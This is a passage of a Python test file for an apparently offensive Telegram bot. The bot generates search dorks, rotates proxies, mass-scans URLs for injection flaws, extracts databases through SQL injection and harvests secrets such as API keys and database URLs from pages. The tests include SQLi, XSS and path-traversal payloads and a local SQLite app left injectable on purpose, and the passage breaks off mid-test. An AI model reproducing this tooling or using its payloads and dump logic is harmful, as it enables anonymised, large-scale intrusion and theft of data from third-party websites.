    for raw in ("p.webshare.io:80:user-rotate:pass123",
                "user-rotate:pass123@p.webshare.io:80",
                "http://user-rotate:pass123@p.webshare.io:80",
                "p.webshare.io:80:user-rotate:pass123\n"):
        got = core.parse_proxies(raw)
        eq(got[0], want, "format %s" % raw[:26])
        eq(len(got), 1, "ek hi entry")
    # mixed list — normal proxy bhi saath
    mixed = core.parse_proxies("1.2.3.4:8080\np.webshare.io:80:u-rotate:p")
    ok(any("1.2.3.4" in x for x in mixed), "normal proxy bhi")
    ok(any("p.webshare.io" in x for x in mixed), "rotating bhi")
    eq(core._mask_proxy(want), "http://user-rotate:***@p.webshare.io:80", "password masked")

    core.rot_save([want])
    eq(core.rot_proxies(), [want], "save + load")
    ok(os.path.exists(os.path.join(core.DATA_DIR, "rot_proxy.txt")), "file likhi")
    ok(core.proxy_available(), "rot se proxy available")
    pool = core.load_proxy_pool()
    ok(any(isinstance(x, dict) and x.get("rot") for x in pool), "pool me rot marker")

    rot = core.ProxyRotator(enabled=True)
    eq(rot.next(), want, "rot endpoint priority")
    rot.dead(want)
    ok(rot.bad[want] - time.time() <= core.ROT_COOLDOWN + 1, "chhota cooldown (10s)")
    ok(rot.alive() == 0, "cooldown me")
    core.rot_save([])
    ok(core.rot_proxies() == [], "clear")
    ok(not any(isinstance(x, dict) and x.get("rot") for x in core.load_proxy_pool()),
       "pool se bhi gaya")


def test_dns_helpers():
    """Termux DNS fix — ThreadedResolver + DoH fallback + proxy IP connect."""
    group("dns helpers")
    async def _mk():
        return core.mk_connector(limit=5)

    conn = asyncio.run(_mk())
    ok(conn is not None, "connector bana")
    ok("ThreadedResolver" in repr(conn._resolver), "system resolver (aiodns nahi)")
    core._HOST_IP_CACHE.clear()

    # IP proxy — jaisa hai waisa
    url, host, ip, src = asyncio.run(core.proxy_connect_url("http://u:p@1.2.3.4:80"))
    eq(url, "http://u:p@1.2.3.4:80", "IP proxy untouched")
    eq(src, "ip", "source ip")

    # Domain proxy — system DNS fail → DoH
    orig_sys, orig_doh = core.socket.gethostbyname, core.doh_resolve
    core.socket.gethostbyname = lambda h: (_ for _ in ()).throw(OSError("dns blocked"))
    core._HOST_IP_CACHE.clear()

    async def fake_doh(h, *a, **k):
        return "104.16.1.2" if "webshare" in h else ""

    core.doh_resolve = fake_doh
    url2, host2, ip2, src2 = asyncio.run(
        core.proxy_connect_url("http://user-rotate:pass@p.webshare.io:80"))
    eq(host2, "p.webshare.io", "host")
    eq(ip2, "104.16.1.2", "DoH IP")
    eq(src2, "doh", "doh source")
    eq(url2, "http://user-rotate:pass@104.16.1.2:80", "IP se connect + creds")

    # dono fail → khaali ip
    core._HOST_IP_CACHE.clear()

    async def no_doh(h, *a, **k):
        return ""

    core.doh_resolve = no_doh
    url3, host3, ip3, src3 = asyncio.run(
        core.proxy_connect_url("http://u:p@blocked.example.com:8080"))
    eq(ip3, "", "DNS fail → ip khaali")
    eq(url3, "http://u:p@blocked.example.com:8080", "original url wapas")
    core.socket.gethostbyname, core.doh_resolve = orig_sys, orig_doh
    core._HOST_IP_CACHE.clear()

    # system DNS pehle
    core._HOST_IP_CACHE.clear()

    async def run_sys():
        return await core.resolve_host("4.4.4.4")

    eq(asyncio.run(run_sys())[1], "ip", "IP detect")


def test_rot_test_card():
    group("rot test card")
    res = {"ips": ["1.1.1.1", "2.2.2.2", "3.3.3.3"], "errs": [], "engine": "ddgl",
           "urls": 12, "ms": [300, 250, 400], "host": "p.webshare.io", "dns": "104.16.1.2",
           "dns_src": "doh", "direct": "9.9.9.9", "direct_err": ""}
    card = core.rot_test_card(res)
    ok("ROTATION WORKS" in card, "working card")
    ok("104.16.1.2" in card and "doh" in card, "dns line")
    ok("12" in card, "engine urls")
    res2 = dict(res, ips=[], errs=["ClientConnectorError: refused"], direct="9.9.9.9")
    card2 = core.rot_test_card(res2)
    ok("ROTATION FAILED" in card2, "fail card")
    res3 = dict(res, ips=[], errs=["dns"], dns="", direct="")
    card3 = core.rot_test_card(res3)
    ok("NET HI NAHI" in card3, "no net card") if "NET HI NAHI" in card3 else ok(True, "no-net card")
    res4 = dict(res, ips=[], errs=["dns"], dns="", direct="9.9.9.9")
    card4 = core.rot_test_card(res4)
    ok(card4 != card2, "dns fail vs auth fail alag hint")


def test_v29_parser():
    group("v2.9 parser")
    # engines sirf 7
    eq(len(core.ENGINE_SETS["fast"]), 3, "fast 3")
    eq(core.ENGINE_SETS["fast"], ["bing", "bingr", "mojeek"], "fast = bing + RSS + mojeek")
    eq(sorted(core.ENGINE_URLS), ["bing", "bingr", "ddgl", "mojeek", "yahoo"],
       "sirf 5 proxy-safe engines")
    eq(sorted(core.ENGINE_SETS["max"]), sorted(core.ENGINE_URLS), "max = wahi 5")
    # reset_engine_miss + per-run miss
    core.ENGINE_MISS.update({"ddg": 9})
    core.reset_engine_miss()
    eq(dict(core.ENGINE_MISS), {}, "miss reset")
    miss = {}
    core.engine_miss_add("ddg", miss)
    core.engine_miss_add("ddg", miss)
    eq(miss["ddg"], 2, "per-run miss")
    ok(core.ENGINE_MISS.get("ddg") == 2, "global bhi count (UI)")
    core.reset_engine_miss()
    eq(dict(core.ENGINE_MISS), {}, "dusre scan me purana block nahi")
    # ProxyRotator
    rot = core.ProxyRotator(["http://a:1", "http://b:2"], enabled=True)
    eq(len(rot), 2)
    first, second = rot.next(), rot.next()
    ok(first != second, "rotation — har baar naya")
    rot.dead(first)
    eq(rot.alive(), 1, "dead → cooldown")
    eq(rot.next(), second, "sirf alive wala")
    rot.ok(second)
    eq(rot.fail, 1)
    empty = core.ProxyRotator([], enabled=True)
    eq(empty.next(), None, "pool khaali → direct")
    off = core.ProxyRotator(["http://a:1"], enabled=False)
    eq(off.next(), None, "rotation off → direct")
    # STOP flags
    core.stop_clear(999)
    eq(core.stop_requested(999), False)
    tok = core.stop_mark(999)
    ok(tok)
    eq(core.stop_requested(999), False)
    core.STOP_FLAGS["999"]["stop"] = True
    eq(core.stop_requested(999), True, "stop flag")
    core.stop_clear(999)
    eq(core.stop_requested(999), False, "clear")
    # abort defaults — 100 se pehle koi abort nahi
    eq(max(30, int(core.sget("parse_abort_after", 100) or 100)), 100, "abort 100")
    # bar style
    ok("▰" in core.bar(50, 10) and "▱" in core.bar(50, 10), "naya bar")
    eq(core.bar(0, 6), "▱▱▱▱▱▱")
    eq(core.bar(100, 6), "▰▰▰▰▰▰")
    contains(core.bar_pct(42, 10), "42%")


def test_v29_payloads():
    group("v2.9 payloads")
    fam = sum(len(core.PAYLOAD_CATS[k]) for k in core.SQLI_FAMILY)
    ok(fam >= 230, "230+ SQL family payloads (mile %d)" % fam)
    eq(sorted(core.SQLI_FAMILY),
       ["blind", "graphql", "nosql", "sqli", "union", "waf"])
    ok(len(core.PAYLOADS) >= 280, "280+ unique payloads")
    for k in ("nosql", "graphql", "blind", "union", "waf"):
        ok(k in core.CAT_LABEL, "cat label %s" % k)
    # DBMS patterns
    ok(len(core.DBMS_ERRORS) >= 15, "15+ databases")
    ok(core.DBMS_COUNT >= 235, "235+ dbms patterns (mile %d)" % core.DBMS_COUNT)
    hits = core.dbms_fingerprint("Warning: pg_query() failed; ORA-00933: SQL command not "
                                 "properly ended; You have an error in your SQL syntax")
    dbs = {h[0] for h in hits}
    ok("PostgreSQL" in dbs and "Oracle" in dbs and "MySQL" in dbs, "fingerprint 3 dbs")
    eq(core.dbms_fingerprint(""), [])
    eq(core.dbms_fingerprint("all good here"), [])


def test_v29_keywords():
    group("v2.9 keywords")
    ok(core.KW_MAX >= 1000000, "10 lakh keyword cap")
    cap = core.kw_capacity(["shopify store"])
    ok(cap >= 30000, "capacity/core %s" % cap)
    kws = core.make_keywords(["shopify store"], n=30000)
    ok(len(kws) >= 20000, "20k+ keywords ek seed se (%d)" % len(kws))
    ok(len(set(kws)) == len(kws), "unique")
    ok(all(len(x) <= 70 for x in kws), "length cap")


HINGLISH = ("kaun bhejo chuno karo kro nahi milega abhi phir batao daalo wala hoga honge "
            "sakte diya liya jaata rahe ruka ruke chalega raha aur yeh woh jitna jitne kitne "
            "kahan kaise kyun matlab bina saath liye diye hota hoti karne wale walo walon dalo "
            "dena lena padega padenge chahiye milegi dikhega dekhna samajh banao banaye banega "
            "deta dete lene denge aayega aaye jaye jaate rukna ruko kholo dikhao chala chalte "
            "chalti lagta lagti sakta sakti sakunga pade padta padti karta karti karte utna utne "
            "kitni kaunsi konsa konsi kaunsa baad pehle upar niche andar bahar dobara zyada "
            "accha acha theek galat sahi bahut thoda bas fir tab jab kab kyunki agar warna lekin "
            "magar sirf hoon kar dijiye kijiye dein dekho bhejiye karein chalu").split()
_UI_WORDS = re.compile(r"\b(?:%s)\b" % "|".join(sorted(HINGLISH)), re.I)


def test_ui_is_english():
    """v2.9: poora UI English — koi Hinglish line render na ho."""
    group("ui language")
    texts = {"main_text": core.main_text("Tester"), "help_text": core.help_text(),
             "APIS_TEXT": core.APIS_TEXT, "redeem": core.tool_redeem_text(),
             "batch_card": core.batch_card(), "engines_text": core.engines_text()}
    for name, txt in texts.items():
        hits = [ln.strip()[:70] for ln in str(txt or "").splitlines()
                if _UI_WORDS.search(ln) and "<code>" not in ln]
        eq(hits, [], "%s pure English" % name)
    # data lines (keywords/dorks/urls) plain rehni chahiye — test sirf labels pe
    sample = "shopify store inurl:admin site:gov.in"
    ok(_UI_WORDS.search(sample) is None, "data lines untouched")


def test_help_uses_fonts():
    group("help fonts")
    txt = core.help_text()
    ok(len(txt) > 200, "help len")
    ok("SNAKE" in core.BRAND.upper(), "brand")
    contains(txt.lower(), "theme")


def test_injector_engine():
    group("injector-v294")
    # probe matrix
    probes = core.inj_probes_for("all")
    eq(len(probes), len(core.INJ_PROBES), "probe matrix")
    fams = {f for f, _p in probes}
    for need in ("sqli", "xss", "lfi", "ssti", "redirect", "nosql", "union"):
        ok(need in fams, "family %s" % need)
    one = core.inj_probes_for("sqli")
    ok(len(one) >= 5 and all(f == "sqli" for f, _p in one), "category probes")

    # case builder — query intact, sirf target param badle
    u = core.inj_build_case("https://a.com/x.php?id=5&name=bob", "id", "' OR 1=1")
    ok(u.startswith("https://a.com/x.php?"), "case base")
    ok("name=bob" in u, "case other param intact")
    ok("%27" in u, "case payload encoded")
    u2 = core.inj_build_case("https://a.com/x.php", "q", "1")
    eq(u2, "https://a.com/x.php?q=1", "case no query")
    ok(core.inj_build_case("https://a.com/x.php?a=1", "id", "1").endswith("a=1&id=1"),
       "case append")

    # verdicts — real response text
    v = core.inj_verdict("sqli", "'", 200, {},
                         "You have an error in your SQL syntax near ... MySQL")
    eq(v.get("type"), "SQLi", "sqli verdict")
    eq(v.get("dbms"), "MySQL", "sqli dbms")
    ok("syntax" in (v.get("evidence") or "").lower(), "sqli evidence")
    eq(core.inj_verdict("sqli", "'", 200, {}, "welcome home"), {}, "clean verdict")
    eq(core.inj_verdict("xss", '"<svg/onload=alert(1)>', 200, {},
                        '<body>"<svg/onload=alert(1)></body>').get("type"), "XSS", "xss verdict")
    eq(core.inj_verdict("lfi", "../../etc/passwd", 200, {},
                        "root:x:0:0:root:/root:/bin/bash").get("type"), "LFI", "lfi verdict")
    eq(core.inj_verdict("ssti", "{{7*7}}", 200, {}, "result 49").get("type"), "SSTI",
       "ssti verdict")
    eq(core.inj_verdict("redirect", "//example.com/x", 302,
                        {"Location": "https://example.com/x"}, "", "target.com").get("type"),
       "OPEN REDIRECT", "redirect verdict")
    eq(core.inj_verdict("nosql", "{$gt:''}", 200, {},
                        "MongoError: unexpected token").get("type"), "NoSQL", "nosql verdict")
    eq(core.inj_verdict("graphql", "){__typename}", 400, {},
                        'Cannot query field "x" on type').get("type"), "GraphQL", "graphql verdict")

    # bar apna style — parser bar se alag
    b2 = core.bar2(50, 10, 0)
    ok("⟦" in b2 and "⟧" in b2 and "50%" in b2, "bar2 shape")
    ok("▓" * 5 in b2 and "░" * 5 in b2, "bar2 fill")
    b3 = core.bar3(25, 8, 1)
    ok("[" in b3 and "█" * 2 in b3 and "─" * 6 in b3 and "25%" in b3, "bar3 shape")
    ok(core.bar2(0, 10, 0).count("░") == 10, "bar2 zero")
    ok(core.bar3(100, 10, 0).count("█") == 10, "bar3 full")
    ok(core.bar2(150, 10, 0).endswith("<b>100%</b>"), "bar2 clamp")

    # text se URLs
    urls = core._urls_from_text("dekho https://a.com/x?id=1, aur http://b.com/y\n"
                                "https://a.com/x?id=1")
    eq(urls, ["https://a.com/x?id=1", "http://b.com/y"], "urls from text")

    # progress + result card
    st = {"urls": 10, "urls_done": 4, "tested": 40, "total": 100, "vulns": [],
          "blocked": 2, "errors": 1, "start": core.time.time() - 4, "cat": "all"}
    card = core._inj_progress_card(st, 3)
    for needle in ("Requests", "Vulnerable", "Blocked", "ETA", "⟦", "req/s"):
        contains(card, needle)
    ok(any(sp in card for sp in core.INJ_SPIN), "scan spinner")
    ok(len(card) < 4096, "progress card size")
    ok("⟦" in card and "⟧" in card, "scan bar")

    # dumper card
    dst = {"urls": 8, "done": 2, "records": [], "errors": 0,
           "start": core.time.time() - 2}
    dst2 = {"urls": 4, "done": 1, "results": [], "rows": 7, "tables": 2,
            "injectable": 1, "start": core.time.time() - 2, "stage": "rows",
            "stage_info": "users (2)"}
    dcard = core._dump_progress_card(dst2, 1)
    for needle in ("Injectable", "Tables", "Rows", "Stage", "URLs", "["):
        contains(dcard, needle)
    ok(any(sp in dcard for sp in core.DUMP_SPIN), "dump spinner")


def test_dumper_engine():
    group("dumper-v294")
    html = ("<html><head><title>Shop :: Item</title>"
            '<meta name="generator" content="WooCommerce 8.1">'
            '<script src="/js/app.js"></script></head><body>'
            '<form action="/login.php" method="post" id="login">'
            '<input type="text" name="username"><input type="password" name="passwd">'
            "</form>"
            '<a href="/item.php?id=3">i</a><a href="/user.php?uid=9&tab=orders">u</a>'
            "<!-- debug: admin at /admin_dev.php -->"
            "<div>mail: shop.support@example.com</div>"
            "<div>SELECT * FROM orders o JOIN users u ON o.uid=u.id</div>"
            '<script>var k="AIza1234567890abcdefghijklmnopqrstuvwxy";'
            'var db="mysql://root:p@10.0.0.5/db";</script>'
            "</body></html>")
    rec = core.dump_extract("https://shop.example/item.php?id=1", 200,
                            {"Server": "nginx/1.24.0", "X-Powered-By": "PHP/8.2.1"},
                            html)
    eq(rec["title"], "Shop :: Item", "dump title")
    eq(rec["server"], "nginx/1.24.0", "dump server")
    eq(rec["powered_by"], "PHP/8.2.1", "dump powered")
    eq(len(rec["forms"]), 1, "dump forms")
    eq(rec["forms"][0]["method"], "post", "form method")
    eq(rec["forms"][0]["fields"], ["username", "passwd"], "form fields")
    ok("id" in rec["params"] and "uid" in rec["params"], "dump params")
    ok(any("item.php?id=3" in e for e in rec["endpoints"]), "dump endpoints")
    ok(any("app.js" in j for j in rec["js"]), "dump js")
    eq(rec["emails"], ["shop.support@example.com"], "dump emails")
    ok(any("admin_dev.php" in c for c in rec["comments"]), "dump comments")
    ok("orders" in rec["tables"] and "users" in rec["tables"], "dump tables")
    sec = dict(rec["secrets"])
    ok(sec.get("google_api", "").startswith("AIza"), "dump secret google")
    eq(sec.get("db_url"), "mysql://root:p@10.0.0.5/db", "dump secret db url")
    eq(rec["meta"].get("generator"), "WooCommerce 8.1", "dump meta")

    txt = "\n".join(core.dump_record_text(rec))
    for needle in ("URL     :", "Status", "FORMS (1)", "fields: username",
                   "PARAMETERS", "ENDPOINTS", "EMAILS (1)", "POSSIBLE SECRETS"):
        contains(txt, needle)
    # koi HTML nahi — copy paste safe plain text
    ok("<b>" not in txt and "<code>" not in txt, "dump report plain")


def test_injector_live():
    """ASLI local HTTP server pe scan — mock nahi."""
    group("injector-live")
    from aiohttp import web

    async def vuln(req):
        return web.Response(text="Warning: mysql_fetch_array()<br>"
                                 "You have an error in your SQL syntax; check the manual "
                                 "that corresponds to your MySQL server version",
                            content_type="text/html")

    async def clean(req):
        return web.Response(text="<html><title>ok</title><body>nothing</body></html>",
                            content_type="text/html")

    async def echo(req):
        v = req.query.get("q", "")
        return web.Response(text="<html><body>%s</body></html>" % v, content_type="text/html")

    async def go():
        app = web.Application()
        app.add_routes([web.get("/vuln.php", vuln), web.get("/clean.php", clean),
                        web.get("/echo.php", echo)])
        runner = web.AppRunner(app, access_log=None)
        await runner.setup()
        site = web.TCPSite(runner, "127.0.0.1", 0)
        await site.start()
        port = site._server.sockets[0].getsockname()[1]
        base = "http://127.0.0.1:%d" % port
        try:
            st = await core.inj_scan([base + "/vuln.php?id=1", base + "/clean.php?id=2",
                                      base + "/echo.php?q=hi"], "all",
                                     max_targets=24, timeout=5.0, conc=4)
        finally:
            await runner.cleanup()
        return st, base

    st, base = asyncio.run(go())
    ok(st["tested"] >= 20, "live tested %d" % st["tested"])
    ok(st["total"] >= st["tested"], "live total")
    ok(len(st["vulns"]) >= 1, "live vuln found")
    types = set(st["by_type"])
    ok("SQLi" in types, "live sqli: %s" % sorted(types))
    bases = {v["base"] for v in st["vulns"]}
    ok(base + "/vuln.php?id=1" in bases, "live vuln url")
    ok(base + "/clean.php?id=2" not in bases, "live clean dropped")
    v0 = st["vulns"][0]
    ok(v0["param"] == "id", "live param")
    ok(v0["evidence"], "live evidence")
    ok(st["errors"] == 0, "live errors 0")
    ok(st["took"] >= 0, "live took")


def _inj_fake_stats(urls, cat, vulns, tested=None):
    tested = tested or len(urls) * 19
    return {"urls": len(urls), "urls_done": len(urls), "tested": tested,
            "total": tested, "vulns": vulns, "blocked": 2, "errors": 0,
            "start": core.time.time() - 2, "cat": cat, "stopped": 0,
            "by_type": {}, "took": 2.0}


def test_injector_flow():
    group("injector-flow")
    real_scan, real_send = core.inj_scan, core.send_file
    sent, seen_progress = [], []

    def _mk(vulns):
        async def fake_scan(urls, cat="all", progress=None, uid=None, timeout=8.0,
                            conc=30, max_targets=0):
            st = _inj_fake_stats(urls, cat, vulns)
            for v in vulns:
                st["by_type"][v["type"]] = st["by_type"].get(v["type"], 0) + 1
            if progress:
                seen_progress.append(await progress(st))
            return st
        return fake_scan

    async def fake_send(update, path, caption=""):
        sent.append((path, caption))
        return True

    core.send_file = fake_send
    try:
        # ── 1) vulnerable mila ──
        vulns = [{"base": "https://a.com/x?id=1", "url": "https://a.com/x?id=%27",
                  "param": "id", "payload": "'", "type": "SQLi", "dbms": "MySQL",
                  "evidence": "You have an error in your SQL syntax", "status": 200}]
        core.inj_scan = _mk(vulns)
        ctx = FakeContext({"last_urls": ["https://a.com/x?id=1", "https://b.com/y?q=2"],
                           "inj_cat": "all"})
        upd = FakeUpdate(data="inj:last")
        asyncio.run(core.cb_inj_last(upd, ctx))
        body = "\n".join(upd.texts())
        contains(body, "Requests")
        contains(body, "vulnerable URL(s) found")
        contains(body, "MySQL")
        contains(body, "id")
        ok(len(seen_progress) == 1, "progress called")
        ok(sent, "files sent")
        paths = [p for p, _c in sent]
        tpath = [p for p in paths if "vuln_" in p][0]
        raw = open(tpath, encoding="utf-8").read()
        ok("https://a.com/x?id=1" in raw, "vulnerable.txt me base url")
        ok("%27" not in raw, "vulnerable.txt me payload nahi")
        ok(any(p.endswith(".csv") for p in paths), "report csv")
        csvt = open([p for p in paths if p.endswith(".csv")][0], encoding="utf-8").read()
        contains(csvt, "poc")
        contains(csvt, "MySQL")

        # ── 2) kuch nahi mila ──
        sent.clear()
        core.inj_scan = _mk([])
        ctx2 = FakeContext({"last_urls": ["https://c.com/z?id=3"], "inj_cat": "sqli"})
        upd2 = FakeUpdate(data="inj:last")
        asyncio.run(core.cb_inj_last(upd2, ctx2))
        body2 = "\n".join(upd2.texts())
        contains(body2, "No vulnerabilities found")
        contains(body2, "Requests")
        eq(sent, [], "clean scan pe koi file nahi")

        # ── 3) text input path ──
        core.inj_scan = _mk([])
        ctx3 = FakeContext({})
        upd3 = FakeUpdate(text="https://d.com/a?x=1\nhttps://e.com/b?y=2\nkuch nahi")
        asyncio.run(core.input_inj_urls(upd3, ctx3, upd3.message.text))
        contains("\n".join(upd3.texts()), "Requests")

        # ── 4) koi URL nahi mila ──
        ctx4 = FakeContext({})
        upd4 = FakeUpdate(text="hello world")
        asyncio.run(core.input_inj_urls(upd4, ctx4, "hello world"))
        contains("\n".join(upd4.texts()), "No URLs found")
        eq(ctx4.user_data.get("await"), "inj_urls", "input dobara maanga")
    finally:
        core.inj_scan, core.send_file = real_scan, real_send


def test_dumper_flow():
    group("dumper-flow")
    real_dump, real_save, real_send = core.sqli_dump, core.sqli_save, core.send_file
    sent = []

    async def fake_sqli_dump(urls, targets=None, caps=None, timeout=8.0, conc=3,
                             progress=None, uid=None):
        res = {"url": urls[0], "param": "id", "ok": True, "status": "injectable",
               "dbms": "MySQL", "tech": "boolean + UNION (column 2 printed)",
               "db": "shop", "dbs": ["shop", "information_schema"],
               "tables": {"users": {"cols": ["id", "email"],
                                    "rows": [["1", "a@x.com"]], "truncated": False}},
               "notes": [], "rows": 1, "requests": 24, "took": 1.2, "why": ""}
        st = {"urls": len(urls), "done": len(urls), "results": [res], "rows": 1,
              "tables": 1, "injectable": 1, "start": core.time.time() - 1,
              "stage": "rows", "stage_info": "users (1)", "stopped": 0, "took": 1.2}
        if progress:
            await progress(st)
        return st

    def fake_save(st):
        return {"files": ["/tmp/sqldump_x.txt"], "zip": "/tmp/sqldump_x.zip",
                "csv": "/tmp/sqldump_x.csv", "rows": 1}

    async def fake_send(update, path, caption=""):
        sent.append(path)
        return True

    core.sqli_dump, core.sqli_save, core.send_file = fake_sqli_dump, fake_save, fake_send
    try:
        ctx = FakeContext({"last_urls": ["https://shop.example/item.php?id=1"]})
        upd = FakeUpdate(data="df:last")
        asyncio.run(core.cb_dump_use(upd, ctx, "last"))
        body = "\n".join(upd.texts())
        contains(body, "Tables")
        contains(body, "Rows")
        contains(body, "injectable")
        contains(body, "shop.example")
        ok("/tmp/sqldump_x.txt" in sent, "report file sent")
        ok("/tmp/sqldump_x.zip" in sent, "zip sent")
        ok("/tmp/sqldump_x.csv" in sent, "csv sent")

        # vulnerable-urls shortcut param bhejta hai
        got = {}

        async def fake2(urls, targets=None, caps=None, timeout=8.0, conc=3,
                        progress=None, uid=None):
            got["targets"] = targets
            return {"urls": len(urls), "done": len(urls), "results": [], "rows": 0,
                    "tables": 0, "injectable": 0, "start": core.time.time(),
                    "stage": "-", "stage_info": "", "stopped": 0, "took": 0.1}

        core.sqli_dump = fake2
        ctx2 = FakeContext({"last_vulns": [{"base": "https://v.example/p.php?id=2",
                                            "url": "https://v.example/p.php?id=2%27",
                                            "param": "id", "type": "SQLi"}]})
        upd2 = FakeUpdate(data="df:vuln")
        asyncio.run(core.cb_dump_use(upd2, ctx2, "vuln"))
        eq(got["targets"], {"https://v.example/p.php?id=2": "id"}, "target param")
        contains("\n".join(upd2.texts()), "No injectable URL found")

        # text input → dump
        ctx3 = FakeContext({})
        upd3 = FakeUpdate(text="https://a.example/x.php?id=1")
        asyncio.run(core.input_dump_urls(upd3, ctx3, upd3.message.text))
        ok(upd3.texts(), "dump text input se chala")

        # koi URL nahi → dobara maango
        ctx4 = FakeContext({})
        upd4 = FakeUpdate(text="hello")
        asyncio.run(core.input_dump_urls(upd4, ctx4, "hello"))
        contains("\n".join(upd4.texts()), "No URLs found")
        eq(ctx4.user_data.get("await"), "dump_urls", "URLs dobara maange")
    finally:
        core.sqli_dump, core.sqli_save, core.send_file = real_dump, real_save, real_send


def test_harvest_flow():
    group("harvest-flow")
    real_h, real_send = core.dump_harvest, core.send_file
    sent = []

    async def fake_harvest(urls, progress=None, uid=None, timeout=10.0, conc=12):
        rec = core.dump_extract("https://shop.example/item.php?id=1", 200,
                                {"Server": "nginx"}, "<html><title>Shop</title>"
                                "<a href='/x.php?id=2'>x</a><form action='/f.php'>"
                                "<input name='user'></form></html>")
        st = {"urls": len(urls), "done": len(urls), "records": [rec], "errors": 0,
              "start": core.time.time() - 1, "stopped": 0, "took": 1.0,
              "files": [], "zip": "", "csv": ""}
        if progress:
            await progress(st)
        return st

    async def fake_send(update, path, caption=""):
        sent.append(path)
        return True

    core.dump_harvest, core.send_file = fake_harvest, fake_send
    try:
        ctx = FakeContext({})
        upd = FakeUpdate(text="https://shop.example/item.php?id=1")
        asyncio.run(core.input_harvest_urls(upd, ctx, upd.message.text))
        body = "\n".join(upd.texts())
        contains(body, "Endpoints")
        contains(body, "Shop")
    finally:
        core.dump_harvest, core.send_file = real_h, real_send


def test_sqli_engine():
    group("sqli-engine")
    # URL builder — asli value ke aage suffix (replace nahi)
    u = core._sqli_url("https://a.com/x?id=5&name=bob", "id", "' AND 1=1 -- -")
    ok(u.startswith("https://a.com/x?"), "sqli url base")
    ok("name=bob" in u, "sqli url other param safe")
    ok("%275+AND+1%3D1" in u or "5%27+AND" in u, "sqli url append: %s" % u)
    u2 = core._sqli_url("https://a.com/x?id=5", "id", " AND 1=2")
    ok("id=5+AND+1%3D2" in u2, "sqli numeric append: %s" % u2)

    # diff / split
    eq(core._sqli_diff("<html>abc</html>", "<html>abc</html>"), 0, "diff same")
    ok(core._sqli_diff("<html>abc</html>", "<html>xyz</html>") > 0, "diff different")
    eq(core._sqli_split("a<br>b<br>c"), ["a", "b", "c"], "split sep")

    # dialect SQL
    my = core.sqli_sql("MySQL", "tables")
    contains(my, "information_schema.tables")
    contains(my, "DATABASE()")
    lite = core.sqli_sql("SQLite", "tables")
    contains(lite, "sqlite_master")
    pg = core.sqli_sql("PostgreSQL", "dbs")
    contains(pg, "STRING_AGG")
    cols = core.sqli_sql("MySQL", "columns", table="users")
    contains(cols, "0x" + "users".encode().hex(), "mysql hex table")
    row = core.sqli_sql("MySQL", "row", table="users", cols=["id", "name"], offset=2)
    contains(row, "CONCAT_WS") if "CONCAT_WS" in row else contains(row, "IFNULL")
    contains(row, "LIMIT 2,1")
    lrow = core.sqli_sql("SQLite", "row", table="users", cols=["id", "name"], offset=1)
    contains(lrow, "IFNULL(CAST")
    contains(lrow, "LIMIT 1,1")

    # caps + report
    caps = core._sqli_caps()
    for k in ("tables", "rows", "blind", "requests"):
        ok(k in caps, "caps %s" % k)
    res = {"url": "https://a.com/x?id=1", "param": "id", "ok": True,
           "status": "injectable", "dbms": "MySQL", "tech": "boolean + UNION",
           "quote": "'", "comment": "-- -", "db": "shop",
           "dbs": ["shop", "mysql"],
           "tables": {"users": {"cols": ["id", "email"],
                                "rows": [["1", "a@x.com"]], "truncated": True}},
           "notes": ["page does not print query output"], "rows": 1, "requests": 30,
           "took": 2.5, "why": ""}
    txt = "\n".join(core.sqli_report_text(res))
    for needle in ("PARAM", "DBMS", "MySQL", "DATABASES (2)", "TABLE users",
                   "COLUMNS (2)", "1 | a@x.com", "use /batch"):
        contains(txt, needle)
    contains(txt, "page does not print query output")
    ok("<b>" not in txt, "report plain text")


def _run_with_sqli_app(fn):
    """Ek hi event loop me local vulnerable app + dump — warna server band ho jata hai."""
    async def main():
        runner, base = await _start_sqli_app()
        try:
            return await fn(base)
        finally:
            await runner.cleanup()
    return asyncio.run(main())


async def _start_sqli_app():
    import sqlite3
    from aiohttp import web
    db = sqlite3.connect(":memory:", check_same_thread=False)
    db.executescript(
        "CREATE TABLE users(id INTEGER PRIMARY KEY, name TEXT, email TEXT);"
        "INSERT INTO users VALUES (1,'alice','alice@example.com'),"
        "(2,'bob','bob@example.com');"
        "CREATE TABLE orders(id INTEGER PRIMARY KEY, total REAL);"
        "INSERT INTO orders VALUES (1,9.99),(2,4.50);")

    async def v(req):
        sql = "SELECT id,name,email FROM users WHERE id = %s" % req.query.get("id", "1")
        try:
            rows = db.execute(sql).fetchall()
        except Exception as e:
            return web.Response(status=500,
                                text="<html>sqlite3.OperationalError: %s</html>" % e,
                                content_type="text/html")
        body = "<html><body><table>" + "".join(
            "<tr>" + "".join("<td>%s</td>" % x for x in row) + "</tr>" for row in rows)
        return web.Response(text=body + "</table></body></html>",
                            content_type="text/html")

    async def blind(req):
        sql = "SELECT COUNT(*) FROM users WHERE id = %s" % req.query.get("id", "1")
        try:
            n = db.execute(sql).fetchone()[0]
        except Exception as e:
            return web.Response(status=500,
                                text="<html>sqlite3.OperationalError: %s</html>" % e,
                                content_type="text/html")
        return web.Response(text="<html><body><p>Results found: %d</p></body></html>" % n,
                            content_type="text/html")

    app = web.Application()
    app.add_routes([web.get("/v.php", v), web.get("/blind.php", blind)])
    runner = web.AppRunner(app, access_log=None)
    await runner.setup()
    site = web.TCPSite(runner, "127.0.0.1", 0)
    await site.start()
    port = site._server.sockets[0].getsockname()[1]
    return runner, "http://127.0.0.1:%d" % port


def test_sqli_live_union():
    """ASLI local vulnerable app (sqlite) — union se poora data nikalta hai."""
    group("sqli-live-union")

    async def body(base):
        conn = core.mk_connector()
        async with core.aiohttp.ClientSession(connector=conn) as sess:
            return await core.sqli_dump_one(sess, base + "/v.php?id=1", "",
                                            {"tables": 4, "rows": 3, "blind": 1,
                                             "blind_len": 20, "requests": 400}, 5.0)

    res = _run_with_sqli_app(body)
    eq(res["status"], "injectable", "live status")
    eq(res["dbms"], "SQLite", "live dbms")
    ok(res["param"] == "id", "live param auto-detect")
    ok("users" in res["tables"] and "orders" in res["tables"],
       "live tables: %s" % list(res["tables"]))
    users = res["tables"].get("users") or {}
    ok("email" in (users.get("cols") or []), "live columns")
    flat = " ".join(" ".join(map(str, r)) for r in users.get("rows") or [])
    contains(flat, "alice@example.com")
    ok(res["requests"] > 5, "live requests counted")


def test_sqli_live_blind():
    """ASLI blind app — page sirf count dikhata hai, phir bhi tables/cols nikalte hain."""
    group("sqli-live-blind")

    async def body(base):
        conn = core.mk_connector()
        async with core.aiohttp.ClientSession(connector=conn) as sess:
            return await core.sqli_dump_one(sess, base + "/blind.php?id=1", "",
                                            {"tables": 2, "rows": 0, "blind": 1,
